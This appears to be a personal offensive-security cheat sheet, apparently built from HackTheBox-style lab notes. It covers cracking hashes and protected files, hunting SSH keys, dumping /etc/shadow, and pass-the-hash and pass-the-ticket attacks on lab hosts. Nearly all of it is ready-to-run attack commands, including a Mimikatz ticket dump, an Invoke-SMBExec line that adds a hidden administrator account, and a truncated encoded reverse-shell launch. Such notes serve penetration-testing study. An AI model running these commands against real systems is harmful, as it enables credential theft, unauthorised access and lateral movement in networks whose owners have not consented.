# Tools

## John The Ripper

```bash
locate *2john*
```

### Single Crack Mode

Uses username, home directory, and GECOS information to generate password candidates, then applies common password-modification rules to crack the hash.

```bash
john --single passwd
```

### Wordlist Mode

```bash
john --wordlist=<wordlist_file> <hash_file>
```

### Incremental mode

Generates password candidates dynamically using statistical patterns and character combinations, making it more effective than random brute force but slower and resource-intensive.

```bash
john --incremental <hash_file>
```

### Identify Hash Format

```bash
hashid -j 193069ceb0461e1d40d216e32c79c70
```

## Hashcat

### Hash Identification

```bash
hashcat --help

# identify hash
hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'

# rule file location
ls -l /usr/share/hashcat/rules
```

### Apply Rule

```bash
hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Mask attack

| Symbol | Charset                             |
| ------ | ----------------------------------- |
| ?l     | abcdefghijklmnopqrstuvwxyz          |
| ?u     | ABCDEFGHIJKLMNOPQRSTUVWXYZ          |
| ?d     | 0123456789                          |
| ?h     | 0123456789abcdef                    |
| ?H     | 0123456789ABCDEF                    |
| ?s     | «space»!"#$%&'()*+,-./:;<=>?@[]^_`{ |
| ?a     | ?l?u?d?s                            |
| ?b     | 0x00 - 0xff                         |
```bash
hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
```

# Cracking Protected Files

Locate encrypted files and SSH keys, extract their hashes using tools such as ssh2john.py, office2john.py, or pdf2john.py, then crack the extracted hashes offline with John the Ripper and a suitable wordlist.

```bash
for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

```bash
# hunt SSH files
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null

# Tell whether an SSH key is encrypted or not
ssh-keygen -yf ~/.ssh/id_ed25519
```

**Cracking Protected Office Files**

```bash
office2john Confidential.xlsx > c.hash
john --wordlist=/usr/share/wordlists/rockyou.txt c.hash
```

# Cracking Protected Archives

```bash
# possible extensions for archives
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

## OpenSSL encrypted GZIP files

The following one-liner may produce several GZIP-related error messages, which can be safely ignored. If the correct password list is used, as in this example, we will see another file successfully extracted from the archive.

```bash
# check file is encrypted with openssl
file GZIP.gzip
# GZIP.gzip: openssl enc'd data with salted password

# crack
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
```

## BitLocker-encrypted drives

**Check Encrypted or Not**: If it returns `$bitlocker$...` hashes, the VHD contains a BitLocker-encrypted volume. If no output appears, it is likely not BitLocker-encrypted or the VHD format is unsupported.

```bash
bitlocker2john -i Backup.vhd | grep 'bitlocker\$'
```

Extracts BitLocker password and recovery-key hashes from an encrypted VHD file and saves them to `backup.hashes` for offline cracking.

```bash
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
cat backup.hash
```

```bash
# crack
hashcat -a 0 -m 22100 hash /usr/share/wordlists/rockyou.txt

john --format=bitlocker --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
```

### Mounting BitLocker-encrypted drives in Windows

Open the `.vhd` file in File Explorer, select the BitLocker volume, and enter the password to unlock it.

### Mounting BitLocker-encrypted drives in Linux

Install `dislocker`, attach the VHD as a loop device, decrypt it, and mount the decrypted volume:

```bash
sudo apt install dislocker
sudo mkdir -p /media/bitlocker /media/bitlockermount

# Attach the VHD and identify the loop device
LOOP=$(sudo losetup --find --show --partscan "$PWD/Backup.vhd")
echo "Loop device: $LOOP"
lsblk "$LOOP"

# Identify the BitLocker partition
PART=$(lsblk -lnpo NAME,TYPE "$LOOP" | awk '$2=="part"{print $1; exit}')
[ -n "$PART" ] || PART="$LOOP"
echo "BitLocker volume: $PART"

# Decrypt and mount the BitLocker volume
sudo dislocker -V "$PART" -u'PASSWORD' -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

Access the files through `/media/bitlockermount`. Unmount after use:

```bash
sudo umount /media/bitlockermount
sudo umount /media/bitlocker
sudo losetup -d "$LOOP"
```

# Default Creds

- https://github.com/ihebski/DefaultCreds-cheat-sheet
- https://www.softwaretestinghelp.com/default-router-username-and-password-list/

Check in tools folder first.

```bash
git clone https://github.com/ihebski/DefaultCreds-cheat-sheet
cd DefaultCreds-cheat-sheet
uv venv
uv pip install -r requirements.txt
./creds search mysql
```


# Linux Password Format

| ID     | Cryptographic Hash Algorithm                                          |
| ------ | --------------------------------------------------------------------- |
| `1`    | [MD5](https://en.wikipedia.org/wiki/MD5)                              |
| `2a`   | [Blowfish](https://en.wikipedia.org/wiki/Blowfish_\(cipher\))         |
| `5`    | [SHA-256](https://en.wikipedia.org/wiki/SHA-2)                        |
| `6`    | [SHA-512](https://en.wikipedia.org/wiki/SHA-2)                        |
| `sha1` | [SHA1crypt](https://en.wikipedia.org/wiki/SHA-1)                      |
| `y`    | [Yescrypt](https://github.com/openwall/yescrypt)                      |
| `gy`   | [Gost-yescrypt](https://www.openwall.com/lists/yescrypt/2019/06/30/1) |
| `7`    | [Scrypt](https://en.wikipedia.org/wiki/Scrypt)                        |

## Cracking Linux Credentials

```bash
# linux password crack
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

```bash
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes /usr/share/wordlists/rockyou.txt -o /tmp/unshadowed.cracked
```

# Pass the Hash

## Windows

### Mimikatz

```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

### Powershell

- https://github.com/Kevin-Robertson/Invoke-TheHash

```powershell
Import-Module .\Invoke-TheHash.psd1

Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

# reverse shell
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjA.........=="
```

## Linux

```bash
# impacket
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

# netexec
nxc smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

# Pass the Ticket

## Windows

### Dumping Tickets

**Note:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

```powershell
mimikatz.exe
sekurlsa::tickets /export
```

```powershell
Rubeus.exe dump /nowrap
```

### Pass the Key aka. OverPass the Hash

Pass the Key (also known as Overpass the Hash) is a post-exploitation technique where an attacker uses a stolen NTLM hash or AES key to request a valid Kerberos Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC).

**Mimikatz**

```powershell
mimikatz.exe
# get the key first
sekurlsa::ekeys
# dump tickets
sekurlsa::tickets /export

# attack
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

**Rubeus**

```powershell
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

### Pass the Ticket

**Rubeus**

```powershell
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt

# using kirbi file
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

# Base64 Format
Rubeus.exe ptt /ticket:doIE1jCCB........
```

```powershell
# Convert .kirbi to Base64 Format
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

**Mimikatz**

```powershell
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

# run to use  cmd
misc::cmd
```

### PowerShell Remoting

**Mimikatz**

```powershell
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

# change powershell
Enter-PSSession -ComputerName DC01
```

**Rubeus**

```powershell
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```